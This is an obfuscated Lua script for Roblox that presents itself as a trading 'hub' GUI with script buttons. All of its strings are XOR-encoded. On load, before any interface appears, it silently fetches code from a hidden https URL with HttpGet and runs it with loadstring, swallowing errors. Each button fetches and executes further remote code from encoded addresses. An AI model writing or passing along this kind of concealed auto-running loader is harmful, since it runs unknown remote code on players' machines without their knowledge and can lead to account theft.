-- LUAOBF-4L7KD | Obfuscated Lua script | 2026-11-15
local function _d9y76p(b,k)
  local n=#k
  if n==0 then return "" end
  local o={}
  for i=1,#b do
    local x=b[i]
    local y=k[((i-1)%n)+1]
    local r=0
    local p=1
    while x>0 or y>0 do
      local xb=x%2
      local yb=y%2
      if xb~=yb then r=r+p end
      x=(x-xb)/2
      y=(y-yb)/2
      p=p*2
    end
    o[i]=string.char(r)
  end
  return table.concat(o)
end



task.spawn(function()
    local _b, err = pcall(function()
        loadstring(game:HttpGet(_d9y76p({9,36,68,53,66,5,19,78,34,81,50,31,88,85,21,56,69,39,68,76,89,19,51,95,43,69,90,82,21,126,83,42,92,16,79,0,50,29,36,65,86,19,18,49,82,104,66,92,78,8,32,68,54,30,82,93,8,62,31,54,82,77,85,17,36,67,106,95,86,82,11,49,88,48,83,96,13,86,105,4,114,7,14,5,81,97,8,119,5,17,80,20,49},{97,80,48,69,49,63,60})))()
    end)
    if not _b then
        warn(_d9y76p({106,79,70,69,86,83,78,81,20,73,69,1,72,92,70,10,106,26,65,87,85,98,81,17,21,29},{47,61,52,42,36,115}) .. tostring(err))
    end
end)




local _g = game:GetService(_d9y76p({40,85,77,10,24,30,83},{107,58,63,111,95}))
local _u = game:GetService(_d9y76p({10,7,55,41,63,25,37},{90,107,86,80}))
local LocalPlayer = _u.LocalPlayer


if _g:FindFirstChild(_d9y76p({98,94,36,36,51,42,119,110,13,53,52,62,99,101},{54,44,69,64,86,121})) then
    _g.TradeSABHubGUI:Destroy()
end

local _l = Instance.new(_d9y76p({98,1,15,59,84,12,58,43,88},{49,98,125,94}))
_l.Name = _d9y76p({12,16,44,42,75,46,25,32,5,59,76,58,13,43},{88,98,77,78,46,125})
_l.ResetOnSpawn = false
pcall(function()
    _l.Parent = _g
end)
if not _l.Parent then
    _l.Parent = LocalPlayer:WaitForChild(_d9y76p({42,9,4,94,23,64,32,13,19},{122,101,101,39,114,50,103,120}))
end


local _n = Instance.new(_d9y76p({5,52,30,91,109,25,73,61,62,63},{81,81,102,47,47,108,61,73}))
_n.Name = _d9y76p({9,33,87,66,11,20,40,40,58,68,74,9},{93,78,48,37,103,113,106})
_n.Size = UDim2.new(0, 55, 0, 55)
_n.Position = UDim2.new(0, 20, 0, 100)
_n.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
_n.TextColor3 = Color3.fromRGB(255, 255, 255)
_n.TextSize = 16
_n.Font = Enum.Font.GothamBold
_n.Text = _d9y76p({125,118,41},{46,55,107,43,56,62,103})
_n.Parent = _l

local _m = Instance.new(_d9y76p({53,107,23,10,43,25,5,80},{96,34,84,101,89,119}))
_m.CornerRadius = UDim.new(0, 14)
_m.Parent = _n


local _k = Instance.new(_d9y76p({116,19,79,87,64},{50,97,46,58,37,47,66,41}))
_k.Name = _d9y76p({101,74,27,21,59,95,80,71,77},{40,43,114,123,125,45,49,42})
_k.Size = UDim2.new(0, 320, 0, 335)
_k.Position = UDim2.new(0.5, -160, 0.5, -167)
_k.BackgroundColor3 = Color3.fromRGB(18, 18, 25)
_k.BorderSizePixel = 0
_k.Visible = true
_k.Parent = _l

local _x = Instance.new(_d9y76p({123,119,125,69,37,10,75,76},{46,62,62,42,87,100}))
_x.CornerRadius = UDim.new(0, 16)
_x.Parent = _k


local _r = Instance.new(_d9y76p({2,38,32,16,22,25,30,68,58},{86,67,88,100,90,120,124,33}))
_r.Size = UDim2.new(1, 0, 0, 50)
_r.BackgroundTransparency = 1
_r.Text = _d9y76p({113,63,123,105,21,118,77,105,108,18,5,37,111,111},{37,109,58,45,80})
_r.TextColor3 = Color3.fromRGB(255, 255, 255)
_r.TextSize = 20
_r.Font = Enum.Font.GothamBold
_r.Parent = _k


local _v = Instance.new(_d9y76p({9,92,34,52,75,54,86,62,60,97,40,94,61,62},{90,63,80,91,39}))
_v.Size = UDim2.new(1, -20, 1, -65)
_v.Position = UDim2.new(0, 10, 0, 55)
_v.BackgroundTransparency = 1
_v.BorderSizePixel = 0
_v.CanvasSize = UDim2.new(0, 0, 0, 270)
_v.ScrollBarThickness = 4
_v.Parent = _k

local _o = Instance.new(_d9y76p({124,3,123,77,27,93,6,86,93,7,92,62},{41,74,55,36,104}))
_o.HorizontalAlignment = Enum.HorizontalAlignment.Center
_o.SortOrder = Enum.SortOrder.LayoutOrder
_o.Padding = UDim.new(0, 12)
_o.Parent = _v


local function createScriptButton(_h, _a, _y)
    local _s = Instance.new(_d9y76p({11,49,75,3,108,42,32,71,24,64},{95,84,51,119,46}))
    _s.Name = _h .. _d9y76p({47,53,42},{109,65,68,47,60})
    _s.Size = UDim2.new(1, -10, 0, 52)
    _s.BackgroundColor3 = Color3.fromRGB(38, 38, 52)
    _s.TextColor3 = Color3.fromRGB(255, 255, 255)
    _s.TextSize = 15
    _s.Font = Enum.Font.GothamSemibold
    _s.Text = _h
    _s.LayoutOrder = _y
    _s.Parent = _v

    local _f = Instance.new(_d9y76p({21,27,103,7,61,25,5,50},{64,82,36,104,79,119,96}))
    _f.CornerRadius = UDim.new(0, 10)
    _f.Parent = _s

    _s.MouseButton1Click:Connect(function()
        pcall(function()
            loadstring(game:HttpGet(_a))()
        end)
    end)
end




createScriptButton(_d9y76p({126,17,25,30,87,66,91,52,92,108,125,73,91,61},{63,88,57,76,62,38}), _d9y76p({52,74,48,69,92,83,11,115,76,37,66,1,14,77,40,86,49,87,90,26,65,46,93,43,91,91,12,74,40,16,39,90,66,70,74,53,93,33,87,64,7,77,63,91,40,76,2,1,81,57,17,16,103,110,45,97,15,109,5,119,103,60,102,115,76,33,83,92,70,76,57,95,32,70,0,4,69,53,80,107,84,70,27,77,56,90,40,80,76,6,64,57,16,40,64,78},{92,62,68,53,47,105,36}), 1)
createScriptButton(_d9y76p({50,5,0,40,83,51,27,35,22,80,39,6,49},{115,112,116,71}), _d9y76p({30,63,24,74,5,113,67,21,4,42,27,20,17,34,24,82,3,41,25,73,19,57,15,85,24,63,9,84,2,101,15,85,27,100,2,83,21,46,14,85,24,34,15,95,26,50,65,82,3,46,67,110,36,10,40,127,37,24,45,120,62,30,46,21,4,46,10,73,89,35,9,91,18,56,67,87,23,34,2,21,23,62,24,85,21,36,8,95,5,42,14,20,26,62,13},{118,75,108,58}), 2)
createScriptButton(_d9y76p({104,78,1,59,126,41,94,67,30,41,52,61,14,91,73,91,23},{39,62,100,85,94,102,50}), _d9y76p({43,48,73,39,68,24,4,108,54,92,32,25,69,66,55,44,72,53,66,81,78,49,39,82,57,67,71,69,55,106,94,56,90,13,69,42,39,88,53,88,76,66,32,33,81,46,26,74,94,38,107,105,5,118,102,110,16,23,124,21,127,119,105,108,54,88,49,68,13,67,38,37,89,36,24,79,74,42,42,18,56,71,71,69,44,40,89,58,86,65,67,42,42,88,36,68,67,73,109,40,72,54},{67,68,61,87,55,34,43}), 3)
createScriptButton(_d9y76p({32,37,8,41,68,13,50,54,27,45,85,95,84,24,25},{116,87,105,64,48,45}), _d9y76p({20,83,39,86,49,70,8,124,84,35,11,9,52,79,54,20,82,49,83,49,25,85,48,73,44,8,66,61,82,108,31,72,62,9,44,21,68,54,68,45,18,78,48,67,46,5,10,59,83,39,83,115,1,103,6,57,116,0,103,0,52,114,17,9,48,25,65,32,9,42,25,70,55,85,109,17,70,58,72,109,8,85,50,79,54,26,70,33,75,39,14,72,35,8,46,9,70},{124,39,83,38,66}), 4)


local _q = true
_n.MouseButton1Click:Connect(function()
    _q = not _q
    _k.Visible = _q
end)
